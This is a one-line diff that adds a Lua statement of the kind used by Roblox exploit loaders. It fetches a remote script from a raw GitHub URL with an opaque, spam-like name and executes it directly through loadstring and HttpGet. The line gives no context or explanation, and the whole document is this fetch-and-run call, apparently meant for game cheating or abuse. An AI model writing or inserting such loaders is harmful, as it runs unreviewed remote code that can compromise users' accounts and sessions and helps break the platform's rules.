@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/hm-corruption-megamind-drop-crazy-skelet-spam3-whid37gbigsi50.lua"))()
